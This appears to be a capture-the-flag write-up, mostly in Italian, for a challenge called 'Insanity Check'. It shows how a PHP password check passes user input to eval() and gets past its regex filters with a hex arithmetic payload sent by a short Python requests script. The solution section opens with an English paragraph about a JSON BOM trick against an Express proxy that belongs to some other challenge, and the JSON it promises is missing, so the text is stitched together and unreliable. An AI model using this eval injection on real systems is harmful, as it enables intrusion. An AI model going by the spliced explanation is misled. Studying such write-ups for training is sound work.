# Insanity Check

## Setup
```
cd build
docker compose up
```
Ora il sito è disponibile al link: [http://localhost:4567](http://localhost:4567).

## Descrizione
@benjamin ha scoperto i firewall???

Corri a fare first blood: [http://www.beginner.havce.it:8080](http://www.beginner.havce.it:8080).


*Author: [@benjamin](https://github.com/b3nj4m1no)*


## Soluzione
You should make a JSON that satisfies the following conditions:

The `backend` server, i.e. a JSON parser of Express, recognizes it as a JSON containing a key `dammilaflag`.
The `proxy` server fails to parse it as a JSON value at `JSON.parse(req.body)`.
In conclusion, the following JSON satisfies them where `\ufeff` is a BOM:


Come affermato nella descrizione, il primo obiettivo era superare le REGEX.


La prima REGEX controlla se la password contiene caratteri non compresi nella funzione `preg_match`, per esempio lo spazio ( ).
```php
if (!preg_match("/^[a-zA-Z0-9_\-'(),]+$/", $inp, $matches))
```

La seconda REGEX:
- Controlla se la stringa contiene almeno un numero.
- Controlla se la stringa contiene almeno una lettera.
- Controlla se la stringa contiene almeno uno degli underscore ( _ ) o dei trattini ( - ).
```php
if (!(preg_match("/[0-9]/", $inp, $matches) && preg_match("/[a-zA-Z]/", $inp, $matches) && preg_match("/[_-]/", $inp, $matches)))
```

La terza REGEX controlla se la password contiene il numero "1".
```php
if (preg_match("/[1]/", $inp, $matches))
```


Arrivati a questo punto dobbiamo porci un altro obiettivo, quello di superare l'ultimo controllo.
```php
if ($inp != "192014812")
```

Ovviamente visto che la stringa contiene il numero "1", la password "192014812" non è valida.
Osservando il codice però, possiamo osservare che prima di `strcmp` viene eseguita la funzione [`eval`](https://www.php.net/manual/en/function.eval.php).
```php
eval("\$input=$inp;");
```
Grazie al funzionamento interno della funzione `eval`, possiamo usarla a nostro favore, passando come parametro "192014812" codificato, per esempio in esadecimale.
Ricordiamoci che non possiamo passare direttamente il numero codificato, ma possiamo per esempio passare `192014822 - 10`.

```py
# Author: @benjamin

import requests

url = "http://www.beginner.havce.it:8080"

# 192145884 --> numero più grande --> hex(192145884) = 0xb73e9dc
# 192014812 --> numero
# 131072    --> differenza --> hex(131072) = 0x20000

payload = {
    "password": "0xb73e9dc-0x20000"
}

r = requests.post(url, data=payload)

print(r.text)
```

## Flag
`CodeVinciCTF{n3vEr_tRu5t_4_w4f_:drop_of_blood:}`
